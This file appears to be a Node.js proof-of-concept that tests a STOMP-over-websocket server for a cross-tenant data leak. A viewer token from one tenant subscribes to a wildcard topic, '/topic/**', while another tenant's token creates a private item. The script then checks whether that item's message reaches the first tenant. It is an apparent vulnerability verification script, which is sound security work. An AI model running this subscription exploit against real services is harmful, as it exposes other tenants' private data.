"use strict";

const baseUrl = process.env.BASE_URL || "http://127.0.0.1:5080";
const destination = process.argv.find((argument) => argument.startsWith("/")) || "/topic/**";
const socketUrl = `${baseUrl.replace(/^http/, "ws")}/websocket/321/poc/websocket`;
const NUL = "\u0000";

function frame(command, headers = {}) {
  return `${command}\n${Object.entries(headers).map(([key, value]) => `${key}:${value}`).join("\n")}\n\n${NUL}`;
}

async function createVictimActivity() {
  const response = await fetch(`${baseUrl}/api/boards/99002/items`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: "Bearer bh_at_contoso_editor_4a8d16" },
    body: JSON.stringify({ title: "PoC private item" }),
  });
  if (!response.ok) throw new Error(`Activity request failed: ${response.status}`);
}

const socket = new WebSocket(socketUrl);
let activityCreated = false;
let messageCount = 0;
const timeout = setTimeout(() => {
  console.error("Timed out waiting for evidence");
  socket.close();
  process.exitCode = 1;
}, 7000);

socket.addEventListener("message", async ({ data }) => {
  console.log(data);
  if (data === "o") {
    socket.send(JSON.stringify([frame("CONNECT", { "accept-version": "1.2", Authorization: "Bearer bh_at_northwind_viewer_7f2c91" })]));
  } else if (data.includes("CONNECTED")) {
    socket.send(JSON.stringify([frame("SUBSCRIBE", { id: "s1", destination, receipt: "s1" })]));
  } else if (data.includes("RECEIPT") && !activityCreated) {
    activityCreated = true;
    await createVictimActivity();
  } else if (data.includes("MESSAGE")) {
    messageCount += 1;
    if (destination.includes("*") && messageCount < 2) return;
    clearTimeout(timeout);
    socket.close();
  } else if (data.includes("ERROR")) {
    clearTimeout(timeout);
    socket.close();
  }
});
socket.addEventListener("error", () => {
  clearTimeout(timeout);
  process.exitCode = 1;
});
